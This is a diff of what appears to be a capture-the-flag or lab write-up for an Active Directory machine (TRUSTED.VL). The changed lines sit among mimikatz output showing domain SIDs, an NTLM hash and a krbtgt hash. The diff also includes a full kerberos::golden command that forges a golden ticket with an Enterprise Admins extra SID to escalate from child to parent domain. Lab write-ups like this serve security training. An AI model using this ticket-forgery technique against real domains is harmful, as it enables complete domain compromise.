@@ -449,12 +449,13 @@ we are already administrator so lets use mimikatz directly
             * rc4_hmac_nt       cddbd971c2e3e4ef64b4eb024e4e75c0
 
 
-    mimikatz # 
 so its about golden ticket
+
+
 
     Current domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)
 
-    Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591
+    Domain: TRUSTED.VL TRUSTED / S-1-5-21-3576695518-347000760-3731839591
 
 ![alt text](../assets/images/7.png)
 
@@ -477,7 +478,9 @@ for krbtgt hash we can use
 
     Credentials:
     Hash NTLM: c7a03c565c68c6fac5f8913fab576ebd
+   
 FULL COMMAND
+
     mimikatz # kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /ptt
     User      : Administrator
     Domain    : lab.trusted.vl (LAB)
